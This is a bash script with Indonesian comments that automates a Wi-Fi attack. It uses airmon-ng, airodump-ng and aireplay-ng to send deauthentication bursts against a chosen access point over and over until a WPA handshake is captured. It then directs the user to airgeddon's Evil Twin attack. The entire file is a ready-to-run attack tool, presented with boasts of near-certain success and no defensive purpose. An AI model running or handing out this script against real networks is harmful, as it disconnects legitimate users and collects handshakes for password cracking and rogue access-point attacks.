#!/bin/bash

# Super Handshake (Smart Capture)
# by Van Helsing Wifi Attack
# 
# Bedanya dengan cara biasa:
# Script ini tidak pakai "Timeout" (waktu habis = gagal).
# Script ini akan TERUS MENERUS melakukan Deauth SAMPAI Handshake didapat.
# Dijamin 99% berhasil asal ada user aktif.

if [ "$#" -ne 3 ]; then
    echo "Usage: sudo bash super_handshake.sh <INTERFACE> <BSSID> <CHANNEL>"
    echo "Example: sudo bash super_handshake.sh wlan0 28:87:BA:68:BC:6F 4"
    exit 1
fi

IFACE=$1
BSSID=$2
CH=$3

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}[*] Menyiapkan Interface $IFACE di Channel $CH...${NC}"

# 1. Pastikan Monitor Mode & Lock Channel
sudo airmon-ng start $IFACE > /dev/null 2>&1
# Cek nama interface monitor (biasanya nambah 'mon')
if ip link show "${IFACE}mon" > /dev/null 2>&1; then
    MON_IFACE="${IFACE}mon"
else
    MON_IFACE="$IFACE"
fi

sudo iw dev $MON_IFACE set channel $CH

# Bersihkan file lama
rm -f super_capture* 2>/dev/null

echo -e "${CYAN}[*] Memulai Listening (Airodump-ng) di Background...${NC}"
# Jalankan Airodump di background
sudo airodump-ng --bssid $BSSID -c $CH -w super_capture --output-format pcap $MON_IFACE > /dev/null 2>&1 &
DUMP_PID=$!

echo -e "${RED}[!] MEMULAI SERANGAN DEAUTH (Tekan Ctrl+C untuk stop manual)${NC}"
echo "    Target: $BSSID (Channel $CH)"
echo "    Strategi: Kirim Deauth -> Tunggu 5 detik -> Cek Handshake -> Ulangi"

# Loop sampai dapat
FOUND=0
ATTEMPT=1

trap "kill $DUMP_PID; exit" SIGINT SIGTERM

while [ $FOUND -eq 0 ]; do
    echo -e "\n----------------------------------------"
    echo -e "Percobaan ke-$ATTEMPT..."
    
    # 2. Kirim Paket Deauth (Surgical Attack - 5 paket saja biar tidak flooding)
    # Aireplay-ng lebih presisi daripada MDK4 untuk handshake
    sudo aireplay-ng -0 5 -a $BSSID $MON_IFACE > /dev/null 2>&1
    
    # 3. Tunggu korban reconnect
    echo "    > Menunggu 8 detik (biar korban connect ulang)..."
    sleep 8
    
    # 4. Cek apakah Handshake sudah masuk file .cap
    # Menggunakan aircrack-ng untuk validasi
    if aircrack-ng super_capture-01.cap 2>&1 | grep -q "1 handshake"; then
        echo -e "${GREEN}[SUCCESS] BOOM! WPA Handshake TERTANGKAP!${NC}"
        FOUND=1
    else
        echo -e "${RED}[FAIL] Belum dapat. Mengulang serangan...${NC}"
        ((ATTEMPT++))
    fi
done

# Matikan airodump
kill $DUMP_PID

echo ""
echo -e "${GREEN}[*] File tersimpan: super_capture-01.cap${NC}"
echo -e "${CYAN}[*] Silakan pakai file ini di menu Evil Twin Airgeddon!${NC}"
